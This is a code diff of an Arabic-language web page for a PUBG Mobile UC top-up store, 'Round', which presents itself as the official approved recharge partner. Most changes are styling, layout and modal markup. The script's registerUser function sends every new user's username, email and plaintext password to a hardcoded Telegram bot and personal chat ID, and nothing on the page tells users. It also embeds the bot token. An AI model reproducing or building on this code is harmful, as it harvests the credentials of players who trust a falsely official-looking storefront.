@@ -18,6 +18,17 @@ body {
     overflow-x: hidden;
 }
 
+/* إزالة اللون الأزرق عند الضغط على العناصر */
+button, .buy-btn, .extra-btn, .country-item, .dropdown-btn, .dropdown-list li, .menu-item, .login-area, .header-account-btn, .auth-btn, .support-btn, .popup-buttons button, .close-menu, .country-modal-btn, .support-close, .auth-switch span {
+    -webkit-tap-highlight-color: transparent;
+    outline: none;
+    user-select: none;
+}
+button:focus, .buy-btn:focus, .extra-btn:focus, .country-item:focus, .dropdown-btn:focus, .menu-item:focus, .login-area:focus, .header-account-btn:focus {
+    outline: none;
+    box-shadow: none;
+}
+
 header {
     background: #111;
     padding: 12px 20px;
@@ -30,7 +41,7 @@ header {
 }
 
 .logo-img {
-    height: 68px;  /* تكبير الشعار */
+    height: 70px;  /* تكبير الشعار */
     width: auto;
     object-fit: contain;
     filter: drop-shadow(0 0 2px rgba(0,0,0,0.5));
@@ -51,7 +62,7 @@ header {
     transition: 0.2s;
     display: flex;
     align-items: center;
-    gap: 6px;
+    gap: 8px;
     font-size: 14px;
     border: 1px solid #333;
 }
@@ -79,20 +90,15 @@ header {
 .login-area span {
     font-size: 16px;
     font-weight: 500;
-    color: #f7c948;
+    color: white;  /* اسم المستخدم أبيض */
 }
 
-.profile-icon-small {
-    width: 24px;
-    height: 24px;
-    background: #f7c948;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-weight: bold;
-    color: #111;
-    font-size: 14px;
+/* أيقونة الملف الشخصي البيضاء */
+.profile-icon-img {
+    width: 20px;
+    height: 20px;
+    object-fit: contain;
+    filter: brightness(0) invert(1); /* تجعل الأيقونة بيضاء */
 }
 
 .menu-icon {
@@ -735,7 +741,7 @@ footer {
     align-items: center;
 }
 .menu-header-img {
-    height: 68px; /* تكبير الشعار في القائمة الجانبية */
+    height: 70px;  /* تكبير الشعار في القائمة الجانبية */
     width: auto;
     object-fit: contain;
 }
@@ -774,35 +780,36 @@ footer {
     background: #222;
     margin: 8px 0;
 }
+/* تغيير تصميم معلومات الحساب في القائمة الجانبية */
 .user-info-top {
     background: #1a1a1a;
     margin-bottom: 8px;
     border-bottom: 1px solid #2a2a2a;
     padding: 20px !important;
+    display: flex !important;
     flex-direction: row !important;
     align-items: center !important;
     justify-content: space-between !important;
     cursor: default !important;
+    gap: 15px;
 }
 .user-info-top .username-large {
-    font-size: 18px;
+    font-size: 20px;
     font-weight: bold;
-    color: #f7c948;
+    color: white;  /* الاسم ابيض */
     word-break: break-word;
     flex: 1;
+    text-align: right;
 }
-.profile-avatar-large {
-    width: 48px;
-    height: 48px;
-    background: #f7c948;
+/* صورة الملف الشخصي البيضاء في القائمة الجانبية */
+.profile-menu-icon {
+    width: 42px;
+    height: 42px;
+    object-fit: contain;
+    filter: brightness(0) invert(1);
+    background: #2a2a2a;
     border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-weight: bold;
-    color: #111;
-    font-size: 24px;
-    margin-left: 12px;
+    padding: 8px;
 }
 
 .auth-modal {
@@ -960,8 +967,8 @@ footer {
     text-align: center;
 }
 
-/* مودال الإشعارات */
-.notifications-modal {
+/* مودال الاشعارات */
+.notification-modal {
     position: fixed;
     top: 0;
     left: 0;
@@ -977,20 +984,20 @@ footer {
     opacity: 0;
     transition: 0.2s;
 }
-.notifications-modal.active {
+.notification-modal.active {
     visibility: visible;
     opacity: 1;
 }
-.notifications-card {
+.notification-card {
     background: #1a1a1a;
-    width: 450px;
+    width: 400px;
     max-width: 90%;
     border-radius: 32px;
-    padding: 24px;
+    padding: 28px 20px;
     border: 1px solid #f7c948;
     text-align: right;
 }
-.notifications-card h3 {
+.notification-card h3 {
     color: #f7c948;
     margin-bottom: 20px;
     text-align: center;
@@ -1002,8 +1009,8 @@ footer {
 }
 .notification-item {
     background: #0f0f0f;
+    border-radius: 20px;
     padding: 12px;
-    border-radius: 16px;
     margin-bottom: 12px;
     border-right: 3px solid #f7c948;
 }
@@ -1013,23 +1020,19 @@ footer {
     margin-bottom: 6px;
 }
 .notification-date {
-    font-size: 10px;
-    color: #888;
-    margin-top: 5px;
+    font-size: 11px;
+    color: #aaa;
+    margin-top: 6px;
 }
-.notification-message {
-    color: #ddd;
+.close-notification {
+    text-align: center;
+    margin-top: 15px;
+    color: #aaa;
+    cursor: pointer;
     font-size: 13px;
 }
-.close-notify-btn {
-    background: #f7c948;
-    color: #111;
-    padding: 8px;
-    border: none;
-    border-radius: 40px;
-    width: 100%;
-    font-weight: bold;
-    cursor: pointer;
+.close-notification:hover {
+    color: #f7c948;
 }
 
 @media (max-width: 680px) {
@@ -1087,11 +1090,11 @@ footer {
 <body>
 
 <header>
-    <img src="Rund.png" alt="Rund" class="logo-img" id="logoImg" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%2268%22 viewBox=%220 0 100 68%22%3E%3Crect width=%22100%22 height=%2268%22 fill=%22%23111%22/%3E%3Ctext x=%2250%22 y=%2240%22 text-anchor=%22middle%22 fill=%22%23f7c948%22 font-size=%2220%22%3ERund%3C/text%3E%3C/svg%3E'">
+    <img src="Rund.png" alt="Rund" class="logo-img" id="logoImg" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%2270%22 viewBox=%220 0 100 70%22%3E%3Crect width=%22100%22 height=%2270%22 fill=%22%23111%22/%3E%3Ctext x=%2250%22 y=%2240%22 text-anchor=%22middle%22 fill=%22%23f7c948%22 font-size=%2224%22%3ERund%3C/text%3E%3C/svg%3E'">
     <div class="nav-icons">
         <div class="login-area" id="loginArea">
-            <div class="profile-icon-small" id="headerProfileIcon">👤</div>
             <span id="loginText">تسجيل الدخول</span>
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2'/%3E%3Ccircle cx='12' cy='7' r='4'/%3E%3C/svg%3E" alt="profile" class="profile-icon-img">
         </div>
         <div id="headerAccountContainer"></div>
         <div class="menu-icon" id="menuIcon">☰</div>
@@ -1101,8 +1104,7 @@ footer {
 <section class="hero">
     <div class="hero-content-new">
         <div class="hero-badge-box">
-            <!-- تم استبدال الكرة الأرضية بـ Rund.png صغير -->
-            <img src="Rund.png" alt="Rund" style="height:28px; width:auto; border-radius:8px;" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2230%22 height=%2230%22 viewBox=%220 0 30 30%22%3E%3Crect width=%2230%22 height=%2230%22 fill=%22%23f7c948%22/%3E%3C/svg%3E'">
+            <img src="Rund.png" alt="Rund" style="height:32px; width:auto; filter:brightness(0) invert(1);" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2232%22 height=%2232%22 viewBox=%220 0 100 100%22%3E%3Crect width=%22100%22 height=%22100%22 fill=%22%23f7c948%22/%3E%3Ctext x=%2250%22 y=%2268%22 text-anchor=%22middle%22 fill=%22black%22 font-size=%2248%22%3ER%3C/text%3E%3C/svg%3E'">
             <span class="pubg-text" id="pubgBrandText">PUBG MOBILE</span>
         </div>
         <img src="PU.png" alt="PU" class="pu-image" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2248%22 height=%2248%22 viewBox=%220 0 100 100%22%3E%3Crect width=%22100%22 height=%22100%22 fill=%22%23f7c948%22 rx=%2216%22/%3E%3Ctext x=%2250%22 y=%2268%22 font-size=%2248%22 text-anchor=%22middle%22 fill=%22black%22 font-weight=%22bold%22%3EPU%3C/text%3E%3C/svg%3E'">
@@ -1116,8 +1118,8 @@ footer {
             <button class="extra-btn" id="couponBtn">استعمال كوبون</button>
             <button class="extra-btn" id="eventsBtn">الأحداث</button>
             <button class="extra-btn" id="vipBtn">حساب مميز</button>
-            <button class="extra-btn" id="notificationsBtn">📢 الإشعارات</button>
             <button class="extra-btn" id="supportBtn">التواصل مع الدعم</button>
+            <button class="extra-btn" id="notificationsBtn">📢 الإشعارات</button>
         </div>
     </div>
 
@@ -1138,7 +1140,7 @@ footer {
 
     <div class="cards" id="cardsContainer"></div>
 
-    <!-- قسم Round -->
+    <!-- قسم Round مع أيقونات مربعة حواف مستديرة -->
     <div class="round-brand-section">
         <div class="round-logo-text">
             <span>Round</span>
@@ -1157,69 +1159,131 @@ footer {
         </div>
     </div>
 
+    <!-- قسم لماذا Round مع النصوص المطلوبة -->
     <div class="why-round-section">
         <div class="why-title"><span>لماذا عليك استخدام موقع Round</span></div>
-        <div class="info-block"><p><span class="info-number">1</span><span class="info-text"><strong>Round: متجر الشحن الرسمي المعتمد لـ PUBG MOBILE في الخارج</strong><br>كشريك دفع حصري معتمد رسميًا لـ PUBG MOBILE في الخارج، يوفر Round خدمات إعادة شحن UC آمنة وفعالة للاعبين...</span></p></div>
-        <div class="info-block"><p><span class="info-number">2</span><span class="info-text"><strong>صفقات UC لفترة محدودة | Round x تحديثات PUBG MOBILE</strong><br>كمنصة شحن رسمية لـ PUBG Mobile، نقدم خصومات حصرية على شراء UC...</span></p></div>
-        <div class="info-block"><p><span class="info-number">3</span><span class="info-text"><strong>PUBG MOBILE | أفضل لعبة موبايل للقتال الملكي</strong><br>كلعبة إطلاق نار تكتيكية مجانية شهيرة عالميًا...</span></p></div>
+        
+        <div class="info-block">
+            <p><span class="info-number">1</span><span class="info-text"><strong>Round: متجر الشحن الرسمي المعتمد لـ PUBG MOBILE في الخارج</strong><br>
+            كشريك دفع حصري معتمد رسميًا لـ PUBG MOBILE في الخارج، يوفر Round خدمات إعادة شحن UC آمنة وفعالة للاعبين في مناطق تشمل هونغ كونغ، اليابان، جنوب شرق آسيا، أوروبا، وأمريكا. بدعم من Alipay، PayPal، وأكثر من 10 طرق دفع، يقدم تخفيضات حصرية وعناصر ذات طبعة محدودة مقارنة بالقنوات غير الرسمية. تشمل الترويجات العادية الخاصة بالمنطقة حزم UC مليئة بالقيمة، حزم هدايا محدودة الوقت، وتخفيضات UC خاصة متوفرة فقط على Round. نوصي بشراء UC أو عناصر داخل اللعبة من خلال متجر Round الرسمي للاستفادة من خدمته الآمنة والموثوقة.</span></p>
+        </div>
+        
+        <div class="info-block">
+            <p><span class="info-number">2</span><span class="info-text"><strong>صفقات UC لفترة محدودة | Round x تحديثات PUBG MOBILE</strong><br>
+            كمنصة شحن رسمية لـ PUBG Mobile، نقدم خصومات حصرية على شراء UC. استفد من خصم يزيد عن 10% عند شراء حزم UC بقيمة 300+ - هذا العرض الخاص محدود لأول 5000 لاعب. يمكن للمستخدمين الدوليين الاستمتاع بإعادة شحن آمنة لـ UC من خلال خدمات Midasbuy العالمية، التي تدعم شحن UC بأسعار معقولة في الولايات المتحدة، باكستان، كندا، الإمارات العربية المتحدة ومناطق أخرى. اشترِ UC بأسعار منخفضة على الفور عبر Razer Gold أو JazzCash لاسترداد مكافآت اللعبة بسلاسة.</span></p>
+        </div>
+        
+        <div class="info-block">
+            <p><span class="info-number">3</span><span class="info-text"><strong>PUBG MOBILE | أفضل لعبة موبايل للقتال الملكي</strong><br>
+            كلعبة إطلاق نار تكتيكية مجانية شهيرة عالميًا، تتميز PUBG MOBILE بساحات قتال متنوعة مثل Erangel وMiramar وRondo. يقوم اللاعبون بإستراتيجيات هبوط بالمظلات لنهب بنادق الهجوم وبنادق القنص والدروع بينما يتكيفون مع المنطقة الزرقاء الديناميكية والدائرة الضيقة المتقلصة. يُتقن نظام المركبات بما في ذلك سيارات UAZ Jeeps والقوارب الجوية ومناورة الطائرات للتفوق على الخصوم عبر أوضاع مثيرة - كلها تهدف إلى الهدف النهائي: أن تصبح آخر ناجٍ في المعارك.</span></p>
+        </div>
     </div>
 </section>
 
 <footer id="footerText">جميع الحقوق محفوظة © PUBG UC Store</footer>
 
-<!-- باقي المودالات كما هي مع إضافة مودال الإشعارات -->
-<div id="idModal" class="modal-overlay">...</div>
-<div id="countryModal" class="country-modal-overlay">...</div>
-<div id="authModal" class="auth-modal">...</div>
-<div id="supportModal" class="support-modal">...</div>
-
-<!-- مودال الإشعارات -->
-<div id="notificationsModal" class="notifications-modal">
-    <div class="notifications-card">
-        <h3>📢 الإشعارات</h3>
-        <div class="notifications-list" id="notificationsList"></div>
-        <button class="close-notify-btn" id="closeNotifyBtn">إغلاق</button>
+<!-- مودال ID PUBG -->
+<div id="idModal" class="modal-overlay">
+    <div class="popup-card">
+        <h3 style="color:#f7c948;" id="modalTitle">معرف اللاعب</h3>
+        <p id="modalUserId">---</p>
+        <div class="popup-buttons">
+            <button id="modalDeleteBtn" class="delete-btn">حذف</button>
+            <button id="modalChangeBtn" class="change-btn">تغيير</button>
+        </div>
     </div>
 </div>
 
+<!-- مودال الدول -->
+<div id="countryModal" class="country-modal-overlay">
+    <div class="country-popup">
+        <h3 id="countryModalTitle">اختر دولتك</h3>
+        <div class="continent-section"><div class="continent-title" id="asiaTitle">آسيا</div><div class="country-grid" id="asiaGrid"></div></div>
+        <div class="continent-section"><div class="continent-title" id="europeTitle">أوروبا</div><div class="country-grid" id="europeGrid"></div></div>
+        <div class="continent-section"><div class="continent-title" id="northAmericaTitle">أمريكا الشمالية</div><div class="country-grid" id="naGrid"></div></div>
+        <div class="continent-section"><div class="continent-title" id="southAmericaTitle">أمريكا الجنوبية</div><div class="country-grid" id="saGrid"></div></div>
+        <div class="close-country-popup" id="closeCountryModalBtn">إغلاق</div>
+    </div>
+</div>
+
+<!-- مودال الاشعارات -->
+<div id="notificationModal" class="notification-modal">
+    <div class="notification-card">
+        <h3>📢 الإشعارات</h3>
+        <div class="notifications-list" id="notificationsList">
+            <div class="notification-item"><div class="notification-title">✨ تحديث جديد</div>تم إضافة عروض UC حصرية بخصم 20% لفترة محدودة.<div class="notification-date">2025-03-20</div></div>
+            <div class="notification-item"><div class="notification-title">🎁 هدية ترحيبية</div>استخدم كود WELCOME10 واحصل على خصم 10% على أول شحنة.<div class="notification-date">2025-03-18</div></div>
+            <div class="notification-item"><div class="notification-title">📱 صيانة الخادم</div>سيتم تحديث الموقع يوم الأحد من 2-4 صباحاً.<div class="notification-date">2025-03-15</div></div>
+        </div>
+        <div class="close-notification" id="closeNotificationBtn">إغلاق</div>
+    </div>
+</div>
+
+<!-- مودال تسجيل الدخول / إنشاء حساب -->
+<div id="authModal" class="auth-modal">
+    <div class="auth-card">
+        <h3 id="authTitle">تسجيل الدخول</h3>
+        <input type="text" id="authUsername" class="auth-input" placeholder="اسم المستخدم" style="display:none;">
+        <input type="email" id="authEmail" class="auth-input" placeholder="البريد الإلكتروني">
+        <input type="password" id="authPassword" class="auth-input" placeholder="كلمة المرور">
+        <div id="authError" class="auth-error"></div>
+        <button id="authSubmitBtn" class="auth-btn">دخول</button>
+        <div id="authSwitchText" class="auth-switch">ليس لديك حساب؟ <span>إنشاء حساب جديد</span></div>
+    </div>
+</div>
+
+<!-- مودال التواصل مع الدعم -->
+<div id="supportModal" class="support-modal">
+    <div class="support-card">
+        <h3>التواصل مع الدعم</h3>
+        <input type="text" id="supportName" class="support-input" placeholder="الاسم" autocomplete="off">
+        <input type="email" id="supportEmail" class="support-input" placeholder="البريد الإلكتروني" readonly>
+        <textarea id="supportMessage" class="support-textarea" placeholder="اكتب رسالتك هنا..."></textarea>
+        <div id="supportError" class="support-error"></div>
+        <button id="sendSupportBtn" class="support-btn">إرسال الرسالة</button>
+        <div class="support-close" id="closeSupportBtn">إغلاق</div>
+    </div>
+</div>
+
+<!-- القائمة الجانبية -->
 <div class="menu-overlay" id="menuOverlay"></div>
 <div class="side-menu" id="sideMenu">
     <div class="menu-header">
-        <img src="Rund.png" alt="Rund" class="menu-header-img" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2280%22 height=%2268%22 viewBox=%220 0 80 68%22%3E%3Crect width=%2280%22 height=%2268%22 fill=%22%23111%22/%3E%3Ctext x=%2240%22 y=%2240%22 text-anchor=%22middle%22 fill=%22%23f7c948%22 font-size=%2220%22%3ERund%3C/text%3E%3C/svg%3E'">
+        <img src="Rund.png" alt="Rund" class="menu-header-img" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2280%22 height=%2270%22 viewBox=%220 0 80 70%22%3E%3Crect width=%2280%22 height=%2270%22 fill=%22%23111%22/%3E%3Ctext x=%2240%22 y=%2240%22 text-anchor=%22middle%22 fill=%22%23f7c948%22 font-size=%2224%22%3ERund%3C/text%3E%3C/svg%3E'">
         <div class="close-menu" id="closeMenuBtn">✕</div>
     </div>
     <div class="menu-items" id="menuItemsList"></div>
 </div>
 
 <script>
-    // ---------------------- ثابت ----------------------
+    // ---------------------- ثابت مهم ----------------------
     const YOUR_PERSONAL_CHAT_ID = '5856975864';
-    const BOT_TOKEN = '8661616245:AAHGabS7i0LyxvOhZ_ATL335evqwSYgiEXI';
-    
-    // --- نظام الإشعارات المخزن لكل مستخدم ---
-    const NOTIFICATIONS_STORAGE = 'pubg_user_notifications';
-    // إشعارات عامة افتراضية (للجميع، سيتم دمجها مع إشعارات خاصة)
-    const DEFAULT_NOTIFICATIONS = [
-        { title: "🎉 تحديث جديد", message: "تم إضافة خصم 20% على جميع باقات UC لفترة محدودة!", date: "2025-03-20", global: true },
-        { title: "📢 رسالة من المطور", message: "شكراً لاستخدامكم موقع Round، قريباً ميزة تتبع الطلبات.", date: "2025-03-18", global: true },
-        { title: "🔥 عرض خاص", message: "اشتري 660UC واحصل على 60UC مجاناً!", date: "2025-03-15", global: true }
-    ];
-    
-    function getUserNotifications(email) {
-        let all = localStorage.getItem(NOTIFICATIONS_STORAGE);
-        let data = all ? JSON.parse(all) : {};
-        return data[email] || [];
+
+    // ---------------------- 1. نظام تسجيل الدخول ----------------------
+    const USERS_KEY = 'pubg_website_users_v2';
+    const CURRENT_USER_KEY = 'pubg_logged_user_data';
+
+    function getUsers() {
+        let users = localStorage.getItem(USERS_KEY);
+        return users ? JSON.parse(users) : [];
     }
-    function addNotificationToUser(email, notif) {
-        let all = localStorage.getItem(NOTIFICATIONS_STORAGE);
-        let data = all ? JSON.parse(all) : {};
-        if(!data[email]) data[email] = [];
-        data[email].unshift({ ...notif, date: new Date().toISOString().slice(0,10) });
-        localStorage.setItem(NOTIFICATIONS_STORAGE, JSON.stringify(data));
+    function saveUsers(users) {
+        localStorage.setItem(USERS_KEY, JSON.stringify(users));
+    }
+    function getLoggedUserData() {
+        let data = localStorage.getItem(CURRENT_USER_KEY);
+        return data ? JSON.parse(data) : null;
+    }
+    function setLoggedUserData(email, username) {
+        if(email && username) localStorage.setItem(CURRENT_USER_KEY, JSON.stringify({ email, username }));
+        else localStorage.removeItem(CURRENT_USER_KEY);
+    }
+    function isLoggedIn() {
+        return !!getLoggedUserData();
     }
     
-    // --- إرسال رسالة تليجرام ---
     async function sendTelegramMessage(text) {
+        const BOT_TOKEN = '8661616245:AAHGabS7i0LyxvOhZ_ATL335evqwSYgiEXI';
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
             const response = await fetch(url, {
@@ -1227,109 +1291,152 @@ footer {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: YOUR_PERSONAL_CHAT_ID, text: text, parse_mode: 'HTML' })
             });
-            return (await response.json()).ok;
-        } catch(err) { return false; }
+            const result = await response.json();
+            return result.ok;
+        } catch(err) {
+            console.error('Telegram error:', err);
+            return false;
+        }
     }
-    
-    // --- نظام تسجيل الدخول ---
-    const USERS_KEY = 'pubg_website_users_v2';
-    const CURRENT_USER_KEY = 'pubg_logged_user_data';
-    function getUsers() { return JSON.parse(localStorage.getItem(USERS_KEY) || '[]'); }
-    function saveUsers(users) { localStorage.setItem(USERS_KEY, JSON.stringify(users)); }
-    function getLoggedUserData() { return JSON.parse(localStorage.getItem(CURRENT_USER_KEY) || 'null'); }
-    function setLoggedUserData(email, username) { if(email && username) localStorage.setItem(CURRENT_USER_KEY, JSON.stringify({ email, username })); else localStorage.removeItem(CURRENT_USER_KEY); }
-    function isLoggedIn() { return !!getLoggedUserData(); }
-    
+
     function registerUser(username, email, password) {
         let users = getUsers();
         if(users.find(u => u.email === email)) return { success: false, msg: 'البريد موجود مسبقاً' };
         if(users.find(u => u.username === username)) return { success: false, msg: 'اسم المستخدم موجود مسبقاً' };
         users.push({ username, email, password });
         saveUsers(users);
-        sendTelegramMessage(`🆕 <b>حساب جديد:</b>\n👤 ${username}\n📧 ${email}\n🔑 ${password}`);
-        // إضافة إشعار ترحيبي للمستخدم الجديد
-        addNotificationToUser(email, { title: "مرحباً بك في Round!", message: "تم إنشاء حسابك بنجاح. يمكنك الآن شراء UC بأمان.", global: false });
+        const message = `🆕 <b>حساب جديد تم إنشاؤه!</b>\n👤 الاسم: ${username}\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;
+        sendTelegramMessage(message);
         return { success: true };
     }
     
     function loginUser(email, password) {
         let users = getUsers();
         let user = users.find(u => u.email === email && u.password === password);
-        if(user) { setLoggedUserData(user.email, user.username); return { success: true, username: user.username }; }
+        if(user) {
+            setLoggedUserData(user.email, user.username);
+            return { success: true, username: user.username };
+        }
         return { success: false, msg: 'بيانات غير صحيحة' };
     }
-    function logoutUser() { setLoggedUserData(null, null); refreshMenuContent(); refreshHeaderAccount(); updateLoginArea(); }
-    
+    function logoutUser() {
+        setLoggedUserData(null, null);
+        refreshMenuContent();
+        refreshHeaderAccount();
+        updateLoginArea();
+    }
+
     function updateLoginArea() {
         const loginSpan = document.getElementById('loginText');
         const loginAreaDiv = document.getElementById('loginArea');
         if(isLoggedIn()) {
             const userData = getLoggedUserData();
             loginSpan.innerText = userData.username;
-            loginAreaDiv.onclick = () => {}; // لا شيء عند الضغط على اسم الحساب
+            loginAreaDiv.onclick = null;  // لا يفتح القائمة عند الضغط على اسم الحساب
         } else {
             loginSpan.innerText = 'تسجيل الدخول';
             loginAreaDiv.onclick = () => openAuthModal();
         }
     }
+
+    // ---------------------- 2. الترجمات ----------------------
+    const translations = {
+        default: { pageTitle: "PUBG UC Store - متجر شدات ببجي", loginArea: "تسجيل الدخول", sectionTitle: "اختر الباقة", coupon: "استعمال كوبون", events: "لأحداث", vip: "حساب VIP", countryPlaceholder: "اختر الدولة", paymentPlaceholder: "اختر وسيلة الدفع", zain: "Zain Cash", asiaHaw: "Asia Hawala", master: "Master Card", buy: "شراء الآن", footer: "جميع الحقوق محفوظة © PUBG UC Store", modalTitle: "معرف اللاعب", deleteBtn: "حذف", changeBtn: "تغيير", pubgBrand: "PUBG MOBILE", countryModalTitle: "اختر دولتك", asia: "آسيا", europe: "أوروبا", northAmerica: "أمريكا الشمالية", southAmerica: "أمريكا الجنوبية", close: "إغلاق", notificationSettings: "اعدادات الاشعارات", ordersCenter: "مركز الطلبات", accountInfo: "معلومات الحساب", logout: "تسجيل الخروج", eventsMenu: "الاحداث", instructions: "التعليمات", support: "الدعم", cardManagement: "إدارة البطاقة" },
+        en: { pageTitle: "PUBG UC Store", loginArea: "Login", sectionTitle: "Choose Package", coupon: "Use Coupon", events: "Events", vip: "VIP Account", countryPlaceholder: "Select Country", paymentPlaceholder: "Payment Method", zain: "Zain Cash", asiaHaw: "Asia Hawala", master: "Master Card", buy: "Buy Now", footer: "All Rights Reserved © PUBG UC Store", modalTitle: "Player ID", deleteBtn: "Delete", changeBtn: "Change", pubgBrand: "PUBG MOBILE", countryModalTitle: "Select Your Country", asia: "Asia", europe: "Europe", northAmerica: "North America", southAmerica: "South America", close: "Close", notificationSettings: "Notification Settings", ordersCenter: "Orders Center", accountInfo: "Account Info", logout: "Logout", eventsMenu: "Events", instructions: "Instructions", support: "Support", cardManagement: "Card Management" }
+    };
     
-    // --- عرض الإشعارات ---
-    function openNotificationsModal() {
-        if(!isLoggedIn()) { alert('يرجى تسجيل الدخول أولاً لعرض الإشعارات'); openAuthModal(); return; }
-        const user = getLoggedUserData();
-        let userNotifs = getUserNotifications(user.email);
-        let allNotifs = [...DEFAULT_NOTIFICATIONS, ...userNotifs];
-        allNotifs.sort((a,b)=> (b.date||'').localeCompare(a.date||''));
-        const container = document.getElementById('notificationsList');
-        if(container) {
-            container.innerHTML = allNotifs.length ? allNotifs.map(n => `
-                <div class="notification-item">
-                    <div class="notification-title">${n.title}</div>
-                    <div class="notification-message">${n.message}</div>
-                    <div class="notification-date">${n.date}</div>
-                </div>
-            `).join('') : '<div style="text-align:center;padding:20px;">لا توجد إشعارات جديدة</div>';
-        }
-        document.getElementById('notificationsModal').classList.add('active');
+    function getLanguageForCountry(country) {
+        const map = { 
+            "الولايات المتحدة":"en","المملكة المتحدة":"en","كندا":"en",
+            "إسبانيا":"es","المكسيك":"es","الأرجنتين":"es",
+            "فرنسا":"fr","ألمانيا":"de","تركيا":"tr",
+            "إيطاليا":"it", "البرازيل":"pt"
+        };
+        return map[country] || "default";
     }
-    function closeNotificationsModal() { document.getElementById('notificationsModal').classList.remove('active'); }
     
-    // --- القائمة الجانبية (بدون ايميل، مع صورة شخصية)---
+    function applyTranslation(langCode) {
+        const t = translations[langCode] || translations.default;
+        document.title = t.pageTitle;
+        document.getElementById("loginText").innerText = isLoggedIn() ? (getLoggedUserData()?.username || t.loginArea) : t.loginArea;
+        document.getElementById("sectionTitle").innerText = t.sectionTitle;
+        document.getElementById("couponBtn").innerHTML = `📦 ${t.coupon}`;
+        document.getElementById("eventsBtn").innerHTML = `🎯 ${t.events}`;
+        document.getElementById("vipBtn").innerHTML = `👑 ${t.vip}`;
+        const supportBtn = document.getElementById("supportBtn");
+        if(supportBtn) supportBtn.innerHTML = `💬 ${t.support}`;
+        if(!localStorage.getItem('selectedCountry')) document.getElementById("countryBtnText").innerText = t.countryPlaceholder;
+        document.getElementById("paymentBtn").innerHTML = t.paymentPlaceholder + " ";
+        let items = document.querySelectorAll("#paymentList li"); if(items[0]) items[0].innerText = t.zain; if(items[1]) items[1].innerText = t.asiaHaw; if(items[2]) items[2].innerText = t.master;
+        document.querySelectorAll(".buy-btn").forEach(btn => btn.innerText = t.buy);
+        document.getElementById("footerText").innerText = t.footer;
+        document.getElementById("modalTitle").innerText = t.modalTitle;
+        document.getElementById("modalDeleteBtn").innerText = t.deleteBtn;
+        document.getElementById("modalChangeBtn").innerText = t.changeBtn;
+        document.getElementById("pubgBrandText").innerText = t.pubgBrand;
+        document.getElementById("countryModalTitle").innerText = t.countryModalTitle;
+        document.getElementById("asiaTitle").innerText = t.asia;
+        document.getElementById("europeTitle").innerText = t.europe;
+        document.getElementById("northAmericaTitle").innerText = t.northAmerica;
+        document.getElementById("southAmericaTitle").innerText = t.southAmerica;
+        document.getElementById("closeCountryModalBtn").innerText = t.close;
+        refreshMenuContent();
+    }
+
+    // ---------------------- 3. القائمة الجانبية ----------------------
     function refreshMenuContent() {
         const container = document.getElementById("menuItemsList");
         if(!container) return;
         const logged = isLoggedIn();
-        const t = { logout:"تسجيل الخروج", eventsMenu:"الاحداث", instructions:"التعليمات", support:"الدعم", cardManagement:"إدارة البطاقة", notifications:"الإشعارات", ordersCenter:"مركز الطلبات" };
+        const currentLang = getLanguageForCountry(localStorage.getItem('selectedCountry') || 'العراق');
+        const t = translations[currentLang] || translations.default;
         let html = '';
         if(logged) {
             const userData = getLoggedUserData();
-            html += `<div class="menu-item user-info-top"><div class="profile-avatar-large">👤</div><div class="username-large">${userData.username}</div></div>`;
-            html += `<div class="menu-item" data-action="notifications">🔔 ${t.notifications}</div>`;
-            html += `<div class="menu-item" data-action="orders">📦 ${t.ordersCenter}</div>`;
-            html += `<div class="menu-item" data-action="cardManagement">💳 ${t.cardManagement}</div>`;
-            html += `<div class="menu-item" data-action="logout">🚪 ${t.logout}</div><div class="menu-divider"></div>`;
+            html += `<div class="menu-item user-info-top">
+                        <div class="username-large">${userData.username}</div>
+                        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='42' height='42' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2'/%3E%3Ccircle cx='12' cy='7' r='4'/%3E%3C/svg%3E" alt="profile" class="profile-menu-icon">
+                    </div>`;
+            html += `<div class="menu-item" data-action="notifications">${t.notificationSettings}</div>`;
+            html += `<div class="menu-item" data-action="orders">${t.ordersCenter}</div>`;
+            html += `<div class="menu-item" data-action="cardManagement">${t.cardManagement}</div>`;
+            html += `<div class="menu-item" data-action="logout">${t.logout}</div>`;
+            html += `<div class="menu-divider"></div>`;
         } else {
-            html += `<div class="menu-item" data-action="login">🔑 تسجيل الدخول</div><div class="menu-divider"></div>`;
+            html += `<div class="menu-item" data-action="login">${t.loginArea}</div>`;
+            html += `<div class="menu-divider"></div>`;
         }
-        html += `<div class="menu-item" data-action="events">🎯 ${t.eventsMenu}</div><div class="menu-item" data-action="instructions">📘 ${t.instructions}</div><div class="menu-item" data-action="support">💬 ${t.support}</div>`;
+        html += `<div class="menu-item" data-action="events">${t.eventsMenu}</div><div class="menu-item" data-action="instructions">${t.instructions}</div><div class="menu-item" data-action="support">${t.support}</div>`;
         container.innerHTML = html;
         document.querySelectorAll(".menu-item[data-action]").forEach(item => {
             item.addEventListener('click', (e) => {
                 const action = item.dataset.action;
                 if(action === 'login') { openAuthModal(); closeMenu(); }
                 else if(action === 'logout') { logoutUser(); alert("تم تسجيل الخروج"); closeMenu(); }
